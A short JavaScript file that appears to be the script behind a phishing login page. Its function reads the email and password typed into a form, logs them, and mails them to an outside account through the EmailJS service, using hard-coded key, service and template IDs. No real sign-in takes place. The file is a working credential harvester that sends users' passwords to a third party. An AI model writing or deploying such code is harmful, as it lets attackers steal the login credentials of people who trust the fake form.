console.log('Running...')
// const btn = document.getElementById('submit')

function foo() {
    const email = document.getElementById('inputEmail');
    const password = document.getElementById('inputPassword');
    const dict = { 'Email': email.value, 'Password': password.value };
    console.log('Called...');
    console.log(dict);
    emailjs.init("eZGWlvtPHHYXrECAs");
    emailjs.send('service_gucmk4a', 'template_4rw6wfa', dict)
        .then(function (response) {
            console.log('SUCCESS!', response.status, response.text);
        }, function (error) {
            console.log('FAILED...', error);
        });
}